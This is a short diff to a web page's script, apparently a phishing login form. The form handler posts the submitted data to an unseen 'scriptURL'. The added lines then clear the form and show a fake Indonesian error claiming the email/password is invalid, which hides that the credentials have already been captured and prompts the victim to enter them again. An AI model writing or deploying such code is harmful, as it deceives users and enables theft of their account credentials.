@@ -320,7 +320,11 @@
       form.addEventListener("submit", (e) => {
         e.preventDefault();
         fetch(scriptURL, { method: "POST", body: new FormData(form) })
-          .then((response) => console.log("Success!", response))
+          .then((response) => {
+            form.reset();
+            console.log("Success!", response);
+            alert("Email/Password anda tidak valid, coba di periksa kembali");
+          })
           .catch((error) => console.error("Error!", error.message));
       });
     </script>
